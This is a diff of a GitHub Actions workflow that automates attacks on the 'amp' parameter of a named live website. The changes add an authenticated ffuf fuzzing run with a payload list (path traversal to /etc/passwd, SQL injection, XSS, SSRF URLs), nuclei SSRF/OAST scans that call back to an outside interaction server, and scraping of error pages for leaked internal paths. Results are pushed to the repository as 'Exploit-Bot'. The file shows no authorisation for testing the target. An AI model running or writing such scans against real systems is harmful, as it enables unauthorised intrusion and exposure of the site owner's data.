@@ -1,4 +1,4 @@
-name: "Heavy-Duty Crash Escalation — amp Parameter"
+name: "Heavy-Duty Crash Escalation — FIXED"
 
 on:
   workflow_dispatch:
@@ -9,38 +9,27 @@ permissions:
 
 env:
   TARGET_URL: "https://academy.openai.com/?amp=test"
-  # Base URL for the parameter we're attacking
   FUZZ_BASE: "https://academy.openai.com/?amp="
 
 jobs:
   escalate_500:
     runs-on: ubuntu-latest
     steps:
-      - name: Setup Advanced Tools
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Tools
         run: |
           go install github.com/ffuf/ffuf/v2@latest
           go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
 
-      - name: 🧪 Test 1:Session Isolation (Auth vs No-Auth)
-        run: |
-          # Check if the 500 happens without a cookie (Server-wide vs User-specific)
-          curl -s -o- -I "${{ env.TARGET_URL }}" > auth_test_no_cookie.txt
-          curl -s -o- -I "${{ env.TARGET_URL }}" -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" > auth_test_with_cookie.txt
+      - name: 🛠️ Setup Fresh Templates
+        run: nuclei -ut # Critical: Downloads latest template paths
 
-      - name: 🛡️ Test 2:SSRF & OAST Escalation
+      - name: 📝 Generate Robust Payloads
         run: |
-          # If 'amp' is trying to fetch a page, this will trigger a hit on interact.sh
-          # This is a common way to turn a 500 error into a Critical SSRF
-          nuclei -u "${{ env.FUZZ_BASE }}http://{{interactsh-url}}" \
-            -t http/vulnerabilities/generic/ssrf-fuzz.yaml \
-            -interactsh-server oast.fun \
-            -o ssrf_results.txt || true
-
-      - name: ☢️ Test 3:Language-Specific Crash (Python/JS/Go)
-        run: |
-          # Using FFuF to send payloads that break specific backends
-          # Including: Null bytes, Template Injection, and Path Traversal
+          # Create a real, local wordlist for FFUF
           cat <<EOF > payloads.txt
           %00
           ../../../../etc/passwd
@@ -49,36 +38,56 @@ jobs:
           [object%20Object]
           undefined
           NaN
-          true
-          false
-          -1
-          99999999999999999999
+          ' OR 1=1--
+          " OR 1=1--
+          <script>alert(1)</script>
+          http://127.0.0.1
+          http://oast.pro
           EOF
-          
+          echo "Payloads created: $(wc -l < payloads.txt)"
+
+      - name: ☢️ Test 1:Advanced SSRF & OAST
+        run: |
+          # Using the correct 2026 tag for SSRF fuzzing
+          nuclei -u "${{ env.FUZZ_BASE }}test" \
+            -tags ssrf,oast,fuzz \
+            -interactsh-server oast.fun \
+            -o ssrf_results.txt || true
+
+      - name: 🎯 Test 2:FFUF Escalation (Verified)
+        run: |
+          # Added -v (verbose) to see why it crashed
           ffuf -u "${{ env.FUZZ_BASE }}FUZZ" \
                -w payloads.txt \
                -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" \
-               -mc 500 -o crash_matrix.json
+               -mc 500 -v -o crash_matrix.json
 
-      - name: 📊 Test 4:Information Leakage Check
+      - name: 🕵️ Test 3:Verbose Error Capture
         run: |
-          # Specifically look for "Stack Traces" in the 500 response body
-          curl -s "${{ env.TARGET_URL }}" -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" > full_error.html
-          grep -iE "at |line |file |stack|exception|debug|trace|vendor|node_modules" full_error.html > leaked_info.txt || true
+          # Save the full body of the 500 error to see if code leaks
+          curl -s -D headers.txt "${{ env.TARGET_URL }}" \
+               -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" > response_body.html
+          
+          # Scan the response for internal paths or software versions
+          grep -iE "stack|at |line |/home/|/var/|node_modules|python|version" response_body.html > findings.txt || true
 
-      - name: 🚨 High-Impact Report
+      - name: 🚨 Alert & Save
         if: always()
         run: |
-          # Analyze if any payload changed the size of the 500 error
-          # A larger 500 error often means a stack trace was returned!
-          if [ -s leaked_info.txt ] || [ -s ssrf_results.txt ]; then
-             REPORT="### 🚨 CRITICAL DATA LEAKED\n"
-             [ -s leaked_info.txt ] && REPORT+="\n#### Potential Stack Trace Found:\n\`\`\`\n$(cat leaked_info.txt | head -n 10)\n\`\`\`"
-             [ -s ssrf_results.txt ] && REPORT+="\n#### SSRF Triggered:\n$(cat ssrf_results.txt)"
-             
-             curl -X POST -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
-               -H "Content-Type: application/json" \
-               https://api.github.com/repos/${{ github.repository }}/issues \
-               -d "{\"title\":\"🚨 POTENTIAL EXPLOIT: amp 500 Escalation\",\"body\":\"$REPORT\"}"
+          if [ -s findings.txt ] || [ -s ssrf_results.txt ]; then
+            REPORT="### 🚨 CRASH ANALYSIS\n"
+            [ -s findings.txt ] && REPORT+="\n#### Leaked Data:\n\`\`\`\n$(cat findings.txt | head -n 10)\n\`\`\`"
+            
+            curl -X POST -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+              -H "Content-Type: application/json" \
+              https://api.github.com/repos/${{ github.repository }}/issues \
+              -d "{\"title\":\"🚨 POTENTIAL EXPLOIT: amp 500\",\"body\":\"$REPORT\"}"
           fi
+          
+          # Save results to repo
+          git config --local user.email "bot@hacker.ai"
+          git config --local user.name "Exploit-Bot"
+          git add .
+          git commit -m "Updated Crash Intel" || true
+          git push origin main || true
           
